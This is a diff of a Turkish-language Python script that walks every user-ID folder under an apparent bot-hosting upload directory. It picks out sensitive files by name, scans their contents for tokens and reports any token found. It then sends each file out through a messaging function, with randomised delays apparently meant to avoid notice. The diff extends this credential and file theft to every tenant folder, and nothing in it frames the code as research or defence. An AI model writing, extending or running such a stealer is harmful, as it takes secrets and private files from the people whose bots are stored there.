@@ -32,7 +32,7 @@ def dosya_gonder(yol):
         return False
     
     if os.path.getsize(yol) > 50 * 1024 * 1024:
-        mesaj_gonder(f"Çok büyük geçti: {os.path.basename(yol)}")
+        mesaj_gonder(f"Çok büyük: {os.path.basename(yol)}")
         return False
 
     try:
@@ -56,53 +56,65 @@ def kritik_dosya(dosya_adi):
     return ad.endswith(kritik_uzantilar) or any(k in ad for k in kritik_kelimeler)
 
 def tara_ve_direkt_gonder():
-    hedef_klasor = " /app/upload_bots/"
+    base_klasor = "/app/upload_bots/"
     
-    if not os.path.exists(hedef_klasor) or not os.path.isdir(hedef_klasor):
-        mesaj_gonder(f"KLASÖR BULUNAMADI → {hedef_klasor}")
+    if not os.path.exists(base_klasor) or not os.path.isdir(base_klasor):
+        mesaj_gonder(f"ANA KLASÖR BULUNAMADI → {base_klasor}")
         return
 
-    mesaj_gonder(f"Taranıyor: {hedef_klasor}")
+    # Tüm ID klasörlerini al (hem sayı hem büyük ID'ler)
+    id_klasorleri = []
+    for item in os.listdir(base_klasor):
+        tam_yol = os.path.join(base_klasor, item)
+        if os.path.isdir(tam_yol):
+            id_klasorleri.append((item, tam_yol))
 
-    bulunanlar = []
+    # Sayısal olarak sırala (1, 2, 3, ..., 8216576697 gibi)
+    id_klasorleri.sort(key=lambda x: (x[0].isdigit(), x[0]))
 
-    for root, dirs, files in os.walk(hedef_klasor):
-        for dosya in files:
-            tam_yol = os.path.join(root, dosya)
-            if kritik_dosya(dosya):
-                bulunanlar.append(tam_yol)
+    mesaj_gonder(f"Toplam {len(id_klasorleri)} adet ID klasörü bulundu. Taranıyor...")
 
-    toplam = len(bulunanlar)
-    mesaj_gonder(f"{toplam} adet kritik dosya bulundu → gönderiyorum")
+    for klasor_adi, klasor_yolu in id_klasorleri:
+        mesaj_gonder(f"\n🔍 Şu an taranıyor → ID: {klasor_adi}")
 
-    gonderilen = 0
+        bulunanlar = []
 
-    for idx, yol in enumerate(bulunanlar, 1):
-        isim = os.path.basename(yol)
-        
-        # Token kontrolü
-        try:
-            with open(yol, "r", encoding="utf-8", errors="ignore") as f:
-                icerik = f.read(600_000)
-            tokenlar = token_var_mi(icerik)
-            if tokenlar:
-                mesaj_gonder(f"TOKEN VAR!\n{yol}\n" + "\n".join(tokenlar[:5]))
-        except:
-            pass
+        for root, dirs, files in os.walk(klasor_yolu):
+            for dosya in files:
+                if kritik_dosya(dosya):
+                    tam_yol = os.path.join(root, dosya)
+                    bulunanlar.append(tam_yol)
 
-        if dosya_gonder(yol):
-            gonderilen += 1
-            mesaj_gonder(f"Gönderildi → {isim}  [{idx}/{toplam}]")
-        else:
-            mesaj_gonder(f"Atlandı → {isim}  (hata / büyük / erişim yok)")
+        toplam = len(bulunanlar)
+        mesaj_gonder(f"   → {toplam} kritik dosya bulundu")
 
-        time.sleep(random.uniform(4.5, 9.0))
+        gonderilen = 0
+        for idx, yol in enumerate(bulunanlar, 1):
+            isim = os.path.basename(yol)
+            
+            # Token kontrolü
+            try:
+                with open(yol, "r", encoding="utf-8", errors="ignore") as f:
+                    icerik = f.read(600_000)
+                tokenlar = token_var_mi(icerik)
+                if tokenlar:
+                    mesaj_gonder(f"TOKEN BULUNDU!\nID: {klasor_adi}\n{yol}\n" + "\n".join(tokenlar[:5]))
+            except:
+                pass
+
+            if dosya_gonder(yol):
+                gonderilen += 1
+                mesaj_gonder(f"   ✅ Gönderildi → {klasor_adi}/{isim}  [{idx}/{toplam}]")
+            else:
+                mesaj_gonder(f"   ❌ Atlandı → {klasor_adi}/{isim}")
+
+            time.sleep(random.uniform(4.5, 9.0))
+
+        mesaj_gonder(f"   📊 {klasor_adi} tamamlandı → {gonderilen}/{toplam} gönderildi")
 
     mesaj_gonder(
-        "█ B İ T T İ █\n"
-        f"Klasör: {hedef_klasor}\n"
-        f"Toplam kritik dosya: {toplam}\n"
-        f"Başarıyla gönderilen: {gonderilen}\n"
+        "█ TÜM İŞLEM BİTTİ █\n"
+        f"Toplam ID klasörü: {len(id_klasorleri)}\n"
         f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
     )
 
